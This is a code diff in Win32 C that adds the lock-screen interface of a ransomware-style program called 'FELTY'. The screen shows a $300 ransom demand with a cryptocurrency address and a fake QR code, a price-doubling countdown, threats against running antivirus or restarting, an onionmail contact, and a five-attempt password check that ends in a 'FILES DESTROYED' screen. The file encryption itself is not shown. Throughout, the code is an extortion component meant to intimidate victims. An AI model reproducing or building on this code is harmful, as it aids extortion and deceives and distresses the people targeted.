+    return DefWindowProcW(hwnd, msg, w, l);
+}
+
+/* ========================================================================
+ *  Layout – centered horizontally, above the info grid
+ * ======================================================================== */
+VOID LayoutControls(HWND hwnd)
+{
+    RECT rc; GetClientRect(hwnd, &rc);
+    int termW = min(rc.right - 40, 820);
+    int termH = min(rc.bottom - 40, 620);
+    int termX = (rc.right - termW) / 2;
+    int termY = (rc.bottom - termH) / 2;
+
+    // Position the edit control just below the title bar (title bar ends at termY+170)
+    int editX = termX + (termW - 260) / 2;
+    int editY = termY + 190;   // moved up slightly, was 210
+
+    SetWindowPos(g_hPassEdit, HWND_TOP, editX, editY, 260, 28, SWP_NOZORDER | SWP_SHOWWINDOW);
+    SetWindowPos(g_hUnlockBtn, HWND_TOP, editX + 260 + 10, editY, 80, 28, SWP_NOZORDER | SWP_SHOWWINDOW);
+}
+
+/* ========================================================================
+ *  DrawScreen – master render
+ * ======================================================================== */
+VOID DrawScreen(HDC hdc, const RECT *rc)
+{
+    HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
+    FillRect(hdc, rc, bg);
+    DeleteObject(bg);
+
+    DrawMatrixRain(hdc, rc);
+
+    if (g_success) {
+        DrawSuccess(hdc, rc);
+        return;
+    }
+    if (g_permanentLock) {
+        DrawPermanentLock(hdc, rc);
+        return;
+    }
+
+    int termW = min(rc->right - 40, 820);
+    int termH = min(rc->bottom - 40, 620);
+    RECT term;
+    term.left   = (rc->right - termW) / 2;
+    term.top    = (rc->bottom - termH) / 2;
+    term.right  = term.left + termW;
+    term.bottom = term.top  + termH;
+
+    DrawTerminal(hdc, &term);
+    LayoutControls(g_hWnd);
+}
+
+/* ========================================================================
+ *  Terminal frame
+ * ======================================================================== */
+VOID DrawTerminal(HDC hdc, const RECT *term)
+{
+    HPEN border = CreatePen(PS_SOLID, 2, RGB(204, 0, 0));
+    HBRUSH bg   = CreateSolidBrush(RGB(10, 0, 0));
+    SelectObject(hdc, border);
+    SelectObject(hdc, bg);
+    Rectangle(hdc, term->left, term->top, term->right, term->bottom);
+    DeleteObject(border);
+    DeleteObject(bg);
+
+    int x = term->left + 20;
+    int w = term->right - term->left - 40;
+    int y = term->top + 10;
+
+    DrawLogo(hdc, x, y, w);
+    DrawTitleBar(hdc, x, y + 80, w);
+    DrawPasswordArea(hdc, x, y + 170, w);
+    int gridY = y + 280;
+    int halfW = (w - 20) / 2;
+    DrawSystemInfo(hdc, x, gridY, halfW, 120);
+    DrawPaymentInfo(hdc, x + halfW + 20, gridY, halfW, 120);
+    DrawWarnings(hdc, x, gridY + 130, w);
+    DrawContactLine(hdc, x, term->bottom - 40, w);
+}
+
+/* ========================================================================
+ *  Logo
+ * ======================================================================== */
+VOID DrawLogo(HDC hdc, int x, int y, int w)
+{
+    (void)w;
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(204, 0, 0));
+    SelectObject(hdc, g_hLogoFont);
+    const wchar_t *lines[] = {
+        L"    ╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗",
+        L"    ║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║",
+        L"    ║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗",
+        L"    ║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║",
+        L"    ║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║",
+        L"    ╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝"
+    };
+    for (int i = 0; i < 6; i++)
+        TextOutW(hdc, x, y + i * 16, lines[i], lstrlenW(lines[i]));
+}
+
+/* ========================================================================
+ *  Title bar
+ * ======================================================================== */
+VOID DrawTitleBar(HDC hdc, int x, int y, int w)
+{
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(255, 0, 0));
+    SelectObject(hdc, g_hTitleFont);
+    RECT r = { x, y, x + w, y + 40 };
+    DrawTextW(hdc, L"FELTY", -1, &r, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
+
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    r.top += 45; r.bottom += 20;
+    DrawTextW(hdc, L"// YOUR SYSTEM HAS BEEN LOCKED //", -1, &r, DT_CENTER | DT_SINGLELINE);
+
+    HPEN sep = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
+    SelectObject(hdc, sep);
+    MoveToEx(hdc, x, y + 80, NULL);
+    LineTo(hdc, x + w, y + 80);
+    DeleteObject(sep);
+}
+
+/* ========================================================================
+ *  Password area labels
+ * ======================================================================== */
+VOID DrawPasswordArea(HDC hdc, int x, int y, int w)
+{
+    (void)w;
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    TextOutW(hdc, x, y, L"> ENTER DECRYPTION PASSWORD TO UNLOCK SYSTEM", 45);
+
+    if (g_attemptsLeft < MAX_ATTEMPTS) {
+        wchar_t status[128];
+        wsprintfW(status, L"> ERROR: Incorrect password. %d attempt(s) remaining.", g_attemptsLeft);
+        TextOutW(hdc, x, y + 50, status, lstrlenW(status));
+    }
+    wchar_t att[64];
+    wsprintfW(att, L"[ ATTEMPTS REMAINING: %d ]", g_attemptsLeft);
+    SetTextColor(hdc, g_attemptsLeft <= 2 ? RGB(255, 68, 68) : RGB(255, 136, 0));
+    TextOutW(hdc, x, y + 70, att, lstrlenW(att));
+
+    SetTextColor(hdc, RGB(255, 68, 68));
+    TextOutW(hdc, x, y + 95, L"WARNING: After 5 failed attempts, the decryption key is permanently destroyed.", 88);
+}
+
+/* ========================================================================
+ *  System info panel (left)
+ * ======================================================================== */
+VOID DrawSystemInfo(HDC hdc, int x, int y, int w, int h)
+{
+    HPEN pen = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
+    HBRUSH bg = CreateSolidBrush(RGB(5, 0, 0));
+    SelectObject(hdc, pen);
+    SelectObject(hdc, bg);
+    Rectangle(hdc, x, y, x + w, y + h);
+    DeleteObject(pen);
+    DeleteObject(bg);
+
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    TextOutW(hdc, x + 8, y + 5, L"// SYSTEM STATUS", 16);
+
+    SetTextColor(hdc, RGB(255, 136, 136));
+    SelectObject(hdc, g_hMainFont);
+    wchar_t info[256];
+    wsprintfW(info, L"Encryption: AES-256-CBC\r\nKey Exchange: RSA-4096\r\nMachine ID: %s\r\nStatus: LOCKED", g_machineId);
+    RECT r = { x + 8, y + 30, x + w - 8, y + h - 8 };
+    DrawTextW(hdc, info, -1, &r, DT_LEFT | DT_WORDBREAK);
+}
+
+/* ========================================================================
+ *  Payment info panel (right)
+ * ======================================================================== */
+VOID DrawPaymentInfo(HDC hdc, int x, int y, int w, int h)
+{
+    HPEN pen = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
+    HBRUSH bg = CreateSolidBrush(RGB(5, 0, 0));
+    SelectObject(hdc, pen);
+    SelectObject(hdc, bg);
+    Rectangle(hdc, x, y, x + w, y + h);
+    DeleteObject(pen);
+    DeleteObject(bg);
+
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    TextOutW(hdc, x + 8, y + 5, L"// PAYMENT REQUIRED", 19);
+
+    SetTextColor(hdc, RGB(255, 204, 0));
+    TextOutW(hdc, x + 8, y + 25, L"$300.00 USD", 11);
+
+    DrawQRPlaceholder(hdc, x + 10, y + 50);
+
+    SetTextColor(hdc, RGB(255, 136, 0));
+    TextOutW(hdc, x + 8, y + 130, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 35);
+
+    SetTextColor(hdc, RGB(255, 0, 0));
+    DWORD elapsed = (GetTickCount() - g_startTick) / 1000;
+    DWORD remaining = (COUNTDOWN_TOTAL_SECONDS > elapsed) ? (COUNTDOWN_TOTAL_SECONDS - elapsed) : 0;
+    wchar_t cd[32];
+    wsprintfW(cd, L"%02d:%02d:%02d", remaining / 3600, (remaining % 3600) / 60, remaining % 60);
+    TextOutW(hdc, x + 8, y + 150, L"Price doubles in", 16);
+    TextOutW(hdc, x + 8, y + 170, cd, lstrlenW(cd));
+}
+
+/* ========================================================================
+ *  Fake QR code
+ * ======================================================================== */
+VOID DrawQRPlaceholder(HDC hdc, int x, int y)
+{
+    int cell = 4;
+    for (int row = 0; row < 25; row++) {
+        for (int col = 0; col < 25; col++) {
+            BOOL on = ((row * 7 + col * 11) % 3) == 0;
+            HBRUSH brush = CreateSolidBrush(on ? RGB(204, 0, 0) : RGB(10, 0, 0));
+            RECT r = { x + col * cell, y + row * cell, x + col * cell + cell, y + row * cell + cell };
+            FillRect(hdc, &r, brush);
+            DeleteObject(brush);
+        }
+    }
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(204, 0, 0));
+    SelectObject(hdc, g_hMainFont);
+    TextOutW(hdc, x + 42, y + 42, L"₿", 1);
+}
+
+/* ========================================================================
+ *  Warnings
+ * ======================================================================== */
+VOID DrawWarnings(HDC hdc, int x, int y, int w)
+{
+    (void)w;
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    const wchar_t *lines[] = {
+        L">> DO NOT ATTEMPT TO DECRYPT FILES YOURSELF",
+        L">> DO NOT RUN ANTIVIRUS — IT WILL DELETE THE DECRYPTION KEY",
+        L">> DO NOT SHUT DOWN OR RESTART YOUR COMPUTER",
+        L">> ONLY THE FELTY DECRYPTION TOOL CAN RESTORE YOUR FILES"
+    };
+    for (int i = 0; i < 4; i++)
+        TextOutW(hdc, x, y + i * 18, lines[i], lstrlenW(lines[i]));
+}
+
+/* ========================================================================
+ *  Contact line
+ * ======================================================================== */
+VOID DrawContactLine(HDC hdc, int x, int y, int w)
+{
+    (void)w;
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    wchar_t contact[256];
+    wsprintfW(contact, L"CONTACT FOR RECOVERY: feltyhelp@onionmail.org  |  Machine ID: %s", g_machineId);
+    TextOutW(hdc, x, y, contact, lstrlenW(contact));
+}
+
+/* ========================================================================
+ *  Permanent lock overlay
+ * ======================================================================== */
+VOID DrawPermanentLock(HDC hdc, const RECT *rc)
+{
+    static BOOL flash = FALSE;
+    HBRUSH bg = CreateSolidBrush(flash ? RGB(180, 0, 0) : RGB(0, 0, 0));
+    FillRect(hdc, rc, bg);
+    DeleteObject(bg);
+
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(204, 0, 0));
+    SelectObject(hdc, g_hLogoFont);
+    int baseY = 100;
+    const wchar_t *hex[] = {
+        L"╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗",
+        L"║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║",
+        L"║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗",
+        L"║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║",
+        L"║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║",
+        L"╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝"
+    };
+    for (int i = 0; i < 6; i++)
+        TextOutW(hdc, (rc->right - 400) / 2, baseY + i * 18, hex[i], lstrlenW(hex[i]));
+
+    SetTextColor(hdc, RGB(255, 255, 255));
+    SelectObject(hdc, g_hTitleFont);
+    RECT tr = { rc->left, baseY + 120, rc->right, baseY + 160 };
+    DrawTextW(hdc, L"FILES DESTROYED", -1, &tr, DT_CENTER | DT_SINGLELINE);
+
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hMainFont);
+    tr.top += 40; tr.bottom += 30;
+    DrawTextW(hdc, L"// PERMANENTLY ENCRYPTED //", -1, &tr, DT_CENTER);
+
+    SetTextColor(hdc, RGB(255, 136, 136));
+    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 40, L"You had 5 attempts to recover your data.", 40);
+    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 60, L"You failed every single one.", 27);
+    SetTextColor(hdc, RGB(255, 0, 0));
+    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 90, L"NOTHING CAN SAVE YOUR FILES NOW.", 33);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    SelectObject(hdc, g_hSmallFont);
+    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 120, L"[ THIS SYSTEM IS PERMANENTLY LOCKED — REINSTALL YOUR OS ]", 57);
+
+    flash = !flash;
+}
+
+/* ========================================================================
+ *  Success screen
+ * ======================================================================== */
+VOID DrawSuccess(HDC hdc, const RECT *rc)
+{
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(0, 255, 0));
+    SelectObject(hdc, g_hTitleFont);
+    RECT r = { rc->left, rc->top + 100, rc->right, rc->top + 200 };
+    DrawTextW(hdc, L"✓\r\nDECRYPTION SUCCESSFUL", -1, &r, DT_CENTER | DT_VCENTER);
+
+    SelectObject(hdc, g_hMainFont);
+    r.top += 120; r.bottom += 40;
+    SetTextColor(hdc, RGB(102, 255, 102));
+    DrawTextW(hdc, L"Your files are being restored. This window will close.", -1, &r, DT_CENTER);
+}
+
+/* ========================================================================
+ *  Matrix rain
+ * ======================================================================== */
+VOID DrawMatrixRain(HDC hdc, const RECT *rc)
+{
+    static wchar_t chars[] = L"FELTY01HEX";
+    SetBkMode(hdc, TRANSPARENT);
+    HFONT old = SelectObject(hdc, g_hMonoFont);
+    int fontH = 12;
+    for (int col = 0; col < 256; col++) {
+        int x = col * 8;
+        if (x > rc->right) break;
+        int yPos = g_drops[col] * fontH;
+        if (yPos > rc->bottom) {
+            if (rand() % 100 < 5) g_drops[col] = 0;
+            continue;
+        }
+        wchar_t c = chars[rand() % 10];
+        SetTextColor(hdc, RGB(150 + rand() % 105, 0, 0));
+        TextOutW(hdc, x, yPos, &c, 1);
+        g_drops[col]++;
+    }
+    SelectObject(hdc, old);
+}
+
+VOID InitRain()
+{
+    for (int i = 0; i < 256; i++) g_drops[i] = rand() % 100;
+}
+
+/* ---------- Font init ---------- */
+VOID InitFonts()
+{
+    g_hLogoFont = CreateFontW(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
+    g_hTitleFont = CreateFontW(32, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                               ANTIALIASED_QUALITY, VARIABLE_PITCH | FF_SWISS, L"Impact");
+    g_hMainFont = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
+    g_hSmallFont = CreateFontW(10, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                               ANTIALIASED_QUALITY, VARIABLE_PITCH | FF_MODERN, L"Courier New");
+    g_hMonoFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
+}
+
+/* ---------- Password check ---------- */
+VOID CheckPassword()
+{
+    if (g_permanentLock || g_success) return;
+    wchar_t input[256];
+    GetWindowTextW(g_hPassEdit, input, 256);
+    if (lstrcmpW(input, CORRECT_PASSWORD) == 0) {
+        g_success = TRUE;
+        ShowWindow(g_hPassEdit, SW_HIDE);
+        ShowWindow(g_hUnlockBtn, SW_HIDE);
+        InvalidateRect(g_hWnd, NULL, TRUE);
+        SetTimer(g_hWnd, 3, 3000, NULL);
+    } else {
+        g_attemptsLeft--;
+        if (g_attemptsLeft <= 0) {
+            g_permanentLock = TRUE;
+            ShowWindow(g_hPassEdit, SW_HIDE);
+            ShowWindow(g_hUnlockBtn, SW_HIDE);
+        }
+        SetWindowTextW(g_hPassEdit, L"");
+        InvalidateRect(g_hWnd, NULL, TRUE);
+    }
+}
+
+/* ---------- Countdown update ---------- */
+VOID UpdateCountdown()
+{
+    if (g_permanentLock || g_success) return;
+    RECT rc; GetClientRect(g_hWnd, &rc);
+    int termW = min(rc.right - 40, 820);
+    int termH = min(rc.bottom - 40, 620);
+    int termX = (rc.right - termW) / 2;
+    int termY = (rc.bottom - termH) / 2;
+    int halfW = (termW - 60) / 2;
+    RECT inv;
+    inv.left   = termX + 20 + halfW + 20 + 8;
+    inv.top    = termY + 280 + 130 + 150;
+    inv.right  = inv.left + 200;
+    inv.bottom = inv.top  + 60;
+    InvalidateRect(g_hWnd, &inv, FALSE);
 }
